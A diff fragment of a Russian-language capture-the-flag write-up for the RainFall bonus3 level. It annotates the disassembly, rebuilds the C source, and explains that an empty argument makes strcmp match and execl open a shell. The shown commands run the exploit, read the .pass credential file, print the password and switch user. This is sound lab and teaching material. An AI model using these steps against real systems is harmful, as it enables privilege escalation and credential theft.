+0x080485b0 <+188>: mov  %edx,(%esp)           # буфер + 66  1м аргументом
+0x080485b3 <+191>: call 0x80483d0 <fread@plt> # fread(буфер + 66 , 1, 65, f)
+
+# 11. Подготовка и вызов функции fclose():
+0x080485b8 <+196>: mov  0x9c(%esp),%eax       # FILE *f получен
+0x080485bf <+203>: mov  %eax,(%esp)           # FILE *f передан
+0x080485c2 <+206>: call 0x80483c0 <fclose@plt> # fclose(f)
+
+# 12. Подготовка и вызов функции strcmp():
+0x080485c7 <+211>: mov  0xc(%ebp),%eax        # argv
+0x080485ca <+214>: add  $0x4,%eax             # argv + 1
+0x080485cd <+217>: mov  (%eax),%eax           # argv[1]
+0x080485cf <+219>: mov  %eax,0x4(%esp)        # argv[1] передано   2м аргументом
+0x080485d3 <+223>: lea  0x18(%esp),%eax       # буфер
+0x080485d7 <+227>: mov  %eax,(%esp)           # буфер передан      1м аргументом
+0x080485da <+230>: call 0x80483b0 <strcmp@plt> # strcmp(буфер, argv[1])
+
+# 13. if: совпадают ли буфер, argv[1]:
+0x080485df <+235>: test %eax,%eax             # сравнение
+0x080485e1 <+237>: jne  0x8048601 <main+269>  # если не совпали на 269
+
+# 13.1. yes: Подготовка и вызов функции execl():
+0x080485e3 <+239>: movl $0x0,0x8(%esp)        # 0         передан   3м аргументом
+0x080485eb <+247>: movl $0x8048707,0x4(%esp)  # "sh"      передан   2м аргументом
+0x080485f3 <+255>: movl $0x804870a,(%esp)     # "/bin/sh" передан   1м аргументом
+0x080485fa <+262>: call 0x8048420 <execl@plt> # execl("/bin/sh", "sh", 0)
+0x080485ff <+267>: jmp  0x8048610 <main+284>
+
+# 13.2. no: Подготовка и вызов функции puts():
+0x08048601 <+269>: lea  0x18(%esp),%eax       # буфер
+0x08048605 <+273>: add  $0x42,%eax            # eax + 66
+0x08048608 <+276>: mov  %eax,(%esp)           # eax + 66 передано
+0x0804860b <+279>: call 0x80483e0 <puts@plt>  # puts(eax + 66)
+
+# 14. Завершение и возврат из main():
+# 14.1. 0 будет передано как код завершения программы:
+0x08048610 <+284>: mov  $0x0,%eax
+0x08048615 <+289>: lea  -0x8(%ebp),%esp
+# 14.2. Завершение и возврат из main():
+0x08048618 <+292>: pop  %ebx
+0x08048619 <+293>: pop  %edi
+0x0804861a <+294>: pop  %ebp
+0x0804861b <+295>: ret    
+# End of assembler dump.
+```
+</details>
+
+```c
+int main() {
+
+FILE *f = fopen("/home/user/end/.pass", "r");  // пункт  2
+
+буфер создан и заполнен нулями;                // пункт  3
+
+if (f    == 0) return -1;          // пункт  4 и 6
+if (argc != 2) return -1;          // пункт  5 и 6
+
+fread(буфер , 1, 66, f);           // пункт  7
+
+буфер[65] = 0;                     // пункт  8
+буфер[ atoi(argv[1]) ] = 0;        // пункт  9
+
+fread(буфер + 66 , 1, 65, f);      // пункт 10
+
+fclose(f);                         // пункт 11
+
+if (strcmp(буфер, argv[1]) == 0) { // пункт 12 и 13
+      execl("/bin/sh", "sh", 0);   // пункт 13.1
+  } else {
+      puts(буфер + 66);            // пункт 13.2
+  }
+
+return 0;                          // пункт 14 disassemble main
+
+}
+```
+Если ввести пустую строку, то `буфер[ atoi(argv[1]) ] = 0` \
+заполнит &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; `буфер[0] = 0`.
+
+И при сравнении `strcmp(буфер, argv[1])` \
+я получаю &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; `strcmp("", "")`. 
+
+Попадаю на &nbsp; &nbsp; &nbsp; `execl("/bin/sh", "sh", 0)`.
+
+Атакую:
+```sh
+./bonus3 ""
+# ||
+# \/
+# $ whoami
+# end
+# $ cat /home/user/end/.pass
+# 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+Уровень пройден!
+```sh
+su end
+# Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+
+```sh
+bonus3@RainFall:~$ su end
+# Password: 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+end@RainFall:~$ 
+```
 
 <details> 
   <summary> Под этой строкой в развороте исходник и команда для компиляции: </summary>
@@ -4699,9 +5345,3 @@ int main(int argc, char **argv){
 </pre>
 gcc -m32 -fno-stack-protector -Wl,-z,norelro исходник_level.c -o level
 </details> 
-
-
-
-Уязвимость Use-After-Free
-https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/
-
